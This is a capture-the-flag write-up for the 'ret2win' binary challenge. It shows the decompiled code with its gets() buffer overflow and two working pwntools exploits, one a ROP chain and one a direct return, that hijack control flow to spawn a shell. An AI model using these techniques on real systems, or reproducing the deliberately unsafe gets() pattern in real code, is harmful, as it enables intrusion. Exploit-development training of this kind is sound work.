# ret2win # 

## challenge description ##
---
Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.
```
nc ret2win.challenges.ctf.ritsec.club 1337
```


## Analysis ## 
---

We're given a binary called `ret2win`. Let's do the usual analysis on this: 

```
$ file ret2win 
ret2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6407290ddc178ebcff6a243a585c21e8c32a440b, for GNU/Linux 3.2.0, not stripped

$ checksec ret2win
[*] '/path/to/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

This means that **all modern mitigations are disabled**

- stack cookies are disabled, so we shouldn't have any problems exploiting a stack-based buffer overflow without a leak.
- no PIE means the binary itself is always mapped at address 0x400000, which means we can source ROP gadgets from the binary if we need to.



Let's look at the decompilation:

```c
undefined8 main(void)

{
  puts(
      "Are you expert at exploit development, join the world leading cybersecurity company, Republic  of Potatoes(ROP)"
      );
  puts("[*] This is a simple pwn challenge...get to the secret function!!");
  user_input();
  return 0;
}
```

The `main()` function prints out a welcome message and then calls `user_input()`. It also hints at ROP.

```c
void user_input(void)

{
  char local_28 [32];
  
  gets(local_28);
  printf("[*] Good start %s, now do some damage :) \n",local_28);
  return;
}

```

The `user_input()` function is vulnerable to a trivial stack-based buffer overflow. This would allow us to hijack control flow by overwriting this functions return address on the stack. 

```c
void supersecrettoplevelfunction(int param_1,int param_2)

{
  puts("[*]  if you figure out my address, you are hired.");
  if ((param_1 == -0x35014542) && (param_2 == -0x3f214542)) {
    system("/bin/sh");
  }
  else {
    puts("[!!] You are good but not good enough for my company");
  }
  return;
}
```

As the challenge name suggests, there is also a '`win()`' function that drops us into a shell if we can pass the following check:

```
  if ((param_1 == -0x35014542) && (param_2 == -0x3f214542)) {
```

## Exploitation ##
---
There are two ways of exploiting this binary, the most likely **intended** way and the **easy** way. 

### 1. Intended way ###
We could overwrite `saved rip` with the address of `supersecrettoplevelfunction()`. However, we need to first set `param_1` and `param_2` to the expected values to pass the check. 

Under x86-64 linux, the function calling convention a function expects its first parameter in the `rdi` register and the second parameter in `rsi`. So in order to set these values, we would need a small rop chain: 

```
pop rdi; ret;
rdi_value;
pop rsi; ret; 
rsi_value; 
address_of_supersecrettoplevelfunction
```

Giving us the following exploit: 

```python
#!/usr/bin/env python3
from pwn import *

r = process("./ret2win")
e = ELF("./ret2win")
rop = ROP(e)

# construct payload
payload = b"A" * 32 + b"B" * 8
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(0xffffffffffffffff-0x35014542+1)
payload += p64(rop.find_gadget(["pop rsi", "pop r15", "ret"]).address)
payload += p64(0xffffffffffffffff-0x3f214542+1)
payload += p64(0xdeadbeefcafebabe)
payload += p64(e.symbols['supersecrettoplevelfunction'])

# send payload
r.sendline(payload)
r.interactive()
```

### Easy Way ###

If you think about it, do we really need to return to the start of the function before the if statement? What if, instead of returning to the address `0x401196`, we could return to the exact instruction that calls `system("/bin/sh")` at address `0x4011c6` and completely bypass the check! 

This gives us the following simplified exploit:

```python3
#!/usr/bin/env python3
from pwn import *

r = process("./ret2win")

# construct payload
payload = b"A" * 32 + b"B" * 8
payload += p64(0x4011c6)

# send payload
r.sendline(payload)
r.interactive()
```